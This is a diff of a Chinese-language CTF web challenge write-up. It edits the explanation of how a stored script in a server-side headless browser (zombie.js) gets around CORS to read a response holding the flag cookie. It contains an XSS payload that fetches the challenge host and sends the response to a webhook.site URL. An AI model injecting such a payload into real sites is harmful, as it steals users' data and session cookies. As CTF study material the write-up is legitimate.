@@ -29,13 +29,11 @@
 
 ![web-5.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.1.png)
 
-debug接口有鉴权，访问不成功了，emm,现在可以知道的是，请求头中的cookie信息中含有flag信息，原本想试试访问请求头或者响应头信息 的，但是没有cors可以利用，**普通用户的浏览器**在默认安全策略下是**无法通过 `fetch` 获取跨域响应的内容（包括响应体、响应头等）**的，除非目标服务器主动设置了允许跨域访问的 CORS 头。如果是普通用户浏览器，JS 是拿不到跨域响应内容的；但在题目环境中，往往没开这个限制，甚至可以读取 `file://`。直接读取response信息：
+debug接口有鉴权，访问不成功了，emm,现在可以知道的是，请求头中的cookie信息中含有flag信息，原本想试试访问请求头或者响应头信息 的，但是没有cors可以利用，**普通用户的浏览器**在默认安全策略下是**无法通过 `fetch` 获取跨域响应的内容（包括响应体、响应头等）**的，除非目标服务器主动设置了允许跨域访问的 CORS 头。如果是普通用户浏览器，JS 是拿不到跨域响应内容的；但在题目环境中，zombie.js存在漏洞，甚至可以读取 `file://`。直接读取response信息：
 
 ```
 <script>fetch("http://49.232.142.230:12327/").then((data) => fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?c=".concat(JSON.stringify(data))));</script>
 ```
-
-在 CTF 中通过 `` + `fetch()` 成功读取并 exfiltrate 敏感 response 内容，是因为代码在服务端无头浏览器中运行，**绕过了浏览器原本的 CORS 限制。**
 
 ![web-5.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.2.png)
 
